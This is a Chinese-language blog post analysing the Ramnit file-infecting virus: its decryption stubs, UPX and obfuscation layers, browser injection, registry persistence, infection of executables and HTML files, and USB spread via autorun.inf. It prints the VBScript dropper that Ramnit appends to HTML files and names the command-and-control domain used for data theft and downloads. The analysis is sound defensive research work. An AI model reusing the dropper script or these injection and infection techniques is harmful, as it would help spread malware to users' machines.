# Ramnit感染型病毒分析

阅读量 **1432098**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-11-18 14:30:04

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01227a1bca54304deb.jpg)

## 前言

感染型病毒是通过感染将恶意代码附着于正常程序中，在通过被感染的正常程序进行传播，可见感染型病毒的危害之大。不过只要了解了感染型病毒的原理，其实并没有想象中的那么可怕，今天我将带来的是感染型病毒Ramnit的详细分析。

## 样本信息

样本是我随便找的一个被Ramnit病毒感染的crackme程序

    
    
    样本名：crack_me(cracked).exe
    SHA1:537c992c86674a442eb3c33140feaeec7ae4ab91
    

## 行为分析

使用火绒剑进行行为分析

被感染的样本执行后，会在当前目录下释放`crack_me(cracked)Srv.exe（.*Srv.exe）`病毒母体文件，病毒母体文件会在`C:Program
Files (x86)Microsoft`目录下释放`DesktopLayer.exe`文件

![](https://p2.ssl.qhimg.com/t01e14457924b09aada.png)

`DesktopLayer.exe`进程被创建后，注入chrome浏览器，修改Winlogon注册表项达到自启动目的，并开始感染其他文件

![](https://p5.ssl.qhimg.com/t01b5d3d4ecdf4412f3.png)

![](https://p3.ssl.qhimg.com/t01dce4f996d48f9e79.png)

感染的文件类型主要有exe、dll、htm、html等文件

![](https://p3.ssl.qhimg.com/t01093ef1225a96a421.png)

## 详细分析

详细分析主要分为三个部分，首先从被感染的程序`crack_me(cracked).exe`入手，然后是在当前目录下释放的病毒母体`crack_me(cracked)Srv.exe（.*Srv.exe）`

###  被感染程序

使用IDA打开被感染的程序`crack_me(cracked).exe`，看入口点开头的pusha和结尾的popa，想都不用想，最后的一句`jmp
eax`就是跳转回程序的真正入口点，大多数感染型病毒差不多都是这种形式，相当于给程序加了一层壳，只不过壳代码是恶意代码。

![](https://p2.ssl.qhimg.com/t01d30d4f5fd61c1a8b.png)

![](https://p0.ssl.qhimg.com/t01bd9db3fd04a8c17a.png)

上面的混淆代码就是计算偏移，找到导入函数LoadLibraryA和GetProcAddress的地址，然后通过字符串所在地址的偏移，进而找到其他函数的地址

![](https://p4.ssl.qhimg.com/t017b45c2286bc85002.png)

获取到函数地址后，首先创建一个名为KyUffThOkYwRRtgPP的互斥体，保证唯一运行

![](https://p5.ssl.qhimg.com/t01ca3d92b5a7de91ca.png)

接下来，利用多个异或密钥逐字节循环解密，起始地址为`0x409573`，大小为`0xDC00`

![](https://p3.ssl.qhimg.com/t0196c35d32ecfb0d0b.png)

从`0x40934B`开始倒序取字节D4进行异或解密，直到取到`0x409329`中的47后重新从`0x40934B`开始取值，循环直到结束

![](https://p0.ssl.qhimg.com/t01265947313a72acde.png)

解密后是个PE文件

![](https://p0.ssl.qhimg.com/t01e92a27feab6c75b1.png)

解密后继续执行，首先当前完整进程路径名，创建同名加Srv的exe文件，并将解密后的数据写入文件

![](https://p2.ssl.qhimg.com/t01a7bb07cc90088d8d.png)

![](https://p5.ssl.qhimg.com/t01b91857b03f649083.png)

启动刚创建好的文件，然后跳转到原始程序真正的入口点

![](https://p3.ssl.qhimg.com/t01ed97ff8bbe85077c.png)

###  病毒母体文件

**混淆器部分**

被感染程序解密释放出病毒母体文件`crack_me(cracked)Srv.exe`，查看信息，发现加了UPX壳

    
    
    PE: packer: UPX(3.03)[NRV,best]
    PE: linker: unknown(7.4)[EXE32]
    

首先脱壳

![](https://p1.ssl.qhimg.com/t0162dd4d17e68f1275.png)

用IDA打开，上下看一看，不难发现，这还是一个混淆器，期间各种无意义API调用，无用call等混淆

![](https://p1.ssl.qhimg.com/t01683865b6652536c1.png)

根据尝试，找到入口点第一层关键call

![](https://p0.ssl.qhimg.com/t019849f7c42b4d9240.png)

进入sub_40724D函数，发现还是一堆无意义的call和API的调用，jmp才是真正继续执行的关键。查看IDA的`Graph
overview`中间和结尾出有两处看着像循环解密的部分。

![](https://p0.ssl.qhimg.com/t01e03b9e09e8d30824.png)

将鼠标移到`Graph overview`中部，发现上面又是无意义的API调用，下面的循环看起来也不像是解密用到的

![](https://p5.ssl.qhimg.com/t019c496b94036207e7.png)

鼠标移到`Graph overview`下部，发现这里调用了VirtualAlloc，下面就很可能是循环解密数据了

![](https://p5.ssl.qhimg.com/t01f07a957db886d3eb.png)

使用OD动态跟踪，申请了大小为F000的内存空间

![](https://p4.ssl.qhimg.com/t019b737f61fda2ced9.png)

从地址`0x401F43`开始取值，解密后存放到申请的内存空间

![](https://p3.ssl.qhimg.com/t01097090cc63744798.png)

解密后执行在地址`0x407468`返回到`AllocMemoryBaseAddr + 0x2CA9`继续执行代码

将申请的内存空间dump下来，跳转到`0x2CA9`查看代码流程，发现还是使用jmp跳转进行混淆

![](https://p4.ssl.qhimg.com/t01d10051c4788a4447.png)

跟随代码流程，到`0x0783`这个地址，利用PEB结构获取ntdll加载基址

![](https://p1.ssl.qhimg.com/t01fdc387d0b44f007b.png)

函数内还是一堆混淆跳转，经过简化后汇编语句如下

    
    
    mov edx,dword ptr fs:[0x30]
    mov edx,dword ptr ds:[edx+0xC]
    mov edx,dword ptr ds:[edx+0xC]
    mov edx,dword ptr ds:[edx]
    mov eax,dword ptr ds:[edx+0x18]
    

期间还利用很多次PEB结构获取信息，并再次解密.data数据段数据，最后通过调用ZwFreeVirtualMemory后返回到被解密的.data区段上执行代码

![](https://p1.ssl.qhimg.com/t01bc6c2a3501e0faca.png)

进入.data区段执行代码发现pushad，看汇编的形式，应该又是UPX壳

![](https://p5.ssl.qhimg.com/t013791d7e33bd86505.png)

将此刻状态的样本dump下来，查壳发现这一层使用了3.04版本的UPX壳

![](https://p0.ssl.qhimg.com/t01b5ccd0c36c441914.png)

脱掉UPX壳，才真正到了病毒母体的入口点

**Injecter**

病毒母体的入口点开始部分并没有什么恶意代码，它的主要目的是hook api函数对浏览器注入恶意dll，所以我将这一部分称为Injecter

病毒母体首先会获取浏览器执行程序的路径，创建互斥体，判断当前执行程序路径，hook api函数对浏览器注入恶意dll

![](https://p3.ssl.qhimg.com/t01975762ac8b29ce64.png)

通过注册表获取默认浏览器路径

![](https://p3.ssl.qhimg.com/t01dbfea3e3133121bb.png)

如果找到默认浏览器执行程序文件，直接返回，没找到，则去找IE浏览器执行程序文件

![](https://p1.ssl.qhimg.com/t0126db9186fec858e2.png)

判断当前运行路径是否为`C:Program Files
(x86)MicrosoftDesktopLayer.exe`，如果不是，将自身拷贝到`C:Program Files
(x86)MicrosoftDesktopLayer.exe`，并执行DesktopLayer.exe，返回后当前程序直接退出

![](https://p0.ssl.qhimg.com/t01614cacaacc00725e.png)

当前运行路径为`C:Program Files (x86)MicrosoftDesktopLayer.exe`时，返回后继续执行代码，hook
api函数对浏览器注入恶意dll

![](https://p0.ssl.qhimg.com/t015a3356d6be867e0a.png)

hook ZwWriteVirtualMemory函数

![](https://p3.ssl.qhimg.com/t01fc28281eea611091.png)

创建浏览器进程

![](https://p0.ssl.qhimg.com/t0155c826401245121f.png)

由于CreateProcessA内部会调用ZwWriteVirtualMemory函数，所以会调用到被hook后的地址`0x402A59`执行代码

![](https://p2.ssl.qhimg.com/t01c85565a39b87cafa.png)

首先跳回真正的ZwWriteVirtualMemory继续执行

![](https://p3.ssl.qhimg.com/t01f2d1f408d45cb6f9.png)

![](https://p1.ssl.qhimg.com/t01c24a3ac3001bf4f5.png)

读取浏览器进程内存，获取入口点地址

![](https://p4.ssl.qhimg.com/t0158e1d7707fd9e529.png)

![](https://p0.ssl.qhimg.com/t0102b8a5463bac4836.png)

恶意dll在文件中的开始位置`0x404031`

![](https://p0.ssl.qhimg.com/t01d1ecd5bea115c442.png)

申请内存并将dll写入浏览器进程内存

![](https://p1.ssl.qhimg.com/t01020e5ce3e5d6c0d2.png)

将三个函数写入浏览器进程内存中

![](https://p3.ssl.qhimg.com/t01edbc5ea1b4067ea3.png)

在浏览器程序入口点写入shellcode

![](https://p0.ssl.qhimg.com/t01a53a393c64ddd9d6.png)

当浏览器进程线程被恢复开始运行时，会先调用写入的shellcode，`call
edi`会调用`shellcode_call_first_func`函数，这个函数负责调用写入的`edi_add_0xc_func`函数初始化导入表，调用写入的`edi_add_0x10_func`函数修改区段属性等一系列初始化过程后会调用写入的dllmain函数

![](https://p1.ssl.qhimg.com/t011b37a6bbfbd8d113.png)

![](https://p0.ssl.qhimg.com/t01dafca05e48f31425.png)

**恶意Dll**

在dll入口点，首先创建互斥体判断当前程序是否唯一运行，并初始化一些数据

![](https://p3.ssl.qhimg.com/t01df3da56a0783702b.png)

解密字符串，获取计算机信息，MD5加密信息，在当前目录下生成dmlconf.dat

![](https://p3.ssl.qhimg.com/t010ba8687a9290ecee.png)

![](https://p2.ssl.qhimg.com/t01ff5e069462fc64b6.png)

dll入口点创建了几个线程，分别是写自启动项线程，判断网络连接线程，写文件线程，向fget-career.com发送用户数据线程和在fget-career.com下载文件并运行线程。

其中写自启动线程通过设置`SoftwareMicrosoftWindows
NTCurrentVersionWinlogon`下的UserInit注册表项达到自启动，并每秒检查确认病毒路径是否在其中。

![](https://p0.ssl.qhimg.com/t01a4c55732ffd14486.png)

几个线程创建后，进入感染文件的函数，首先检查注册表中是否存在`Software\WASAntidot`这一项，如果不存在继续感染文件操作

![](https://p1.ssl.qhimg.com/t0179b49e6e263289c7.png)

创建两个线程，一个是感染文件，另一个是感染可移动设备

![](https://p1.ssl.qhimg.com/t018f4c9b749875721e.png)

**首先看infect_file_thread线程函数**

关键感染文件函数，判断文件类型

![](https://p2.ssl.qhimg.com/t01a4d310530165565b.png)

当是exe和dll文件时，打开文件，创建文件映射进行感染，判断是否存在.rmnet 区段

![](https://p2.ssl.qhimg.com/t0136d6bc37fa61a873.png)

如果不存在.rmnet 区段，添加LoadLibraryA，GetProcAddress这2个字符串和.rmnet区段并修改OEP

![](https://p4.ssl.qhimg.com/t0180d638146db7fd5e.png)

当是html和htm文件时，判断文件结尾是否是`</SCRIPT>`

![](https://p4.ssl.qhimg.com/t01722f93a4ec2c11bd.png)

如果不是将在html文件尾部写入数据

创建一个名为svchost.exe的文件，将WriteData中的二进制数据写入文件并执行。

    
    
    <SCRIPT Language=VBScript><!--    DropFileName = "svchost.exe"
    WriteData = "4D5A..."
    Set FSO = CreateObject("Scripting.FileSystemObject")
    DropPath = FSO.GetSpecialFolder(2) & "" & DropFileName
    If FSO.FileExists(DropPath)=False Then
    Set FileObj = FSO.CreateTextFile(DropPath, True)
    For i = 1 To Len(WriteData) Step 2
    FileObj.Write Chr(CLng("&H" & Mid(WriteData,i,2)))
    Next
    FileObj.Close
    End If
    Set WSHshell = CreateObject("WScript.Shell")
    WSHshell.Run DropPath, 0
    //--></SCRIPT>
    

**infect_removable线程函数**

循环遍历磁盘，判断是否为可移动设备

![](https://p4.ssl.qhimg.com/t01533466908b979e61.png)

当是可移动设备时，打开autorun.inf文件，通过 autorun.inf 的头 3 字节是否为 `RmN`判断是否感染

![](https://p0.ssl.qhimg.com/t018c8b44b37da65fc0.png)

![](https://p1.ssl.qhimg.com/t01ff38d407978ec524.png)

如果没被感染，在可移动设备目录下创建 RECYCLER 目录，并在RECYCLER 目录下创建随机名病毒exe文件，添加autorun.inf自动运行病毒

样本分析到此结束

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Iam0x17** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/192603](/post/id/192603)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)
  * [Ramnit](/tag/Ramnit)

 **+1** __28赞

 __收藏

![](https://p4.ssl.qhimg.com/t012f800a60bcc67cd4.png) Iam0x17

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

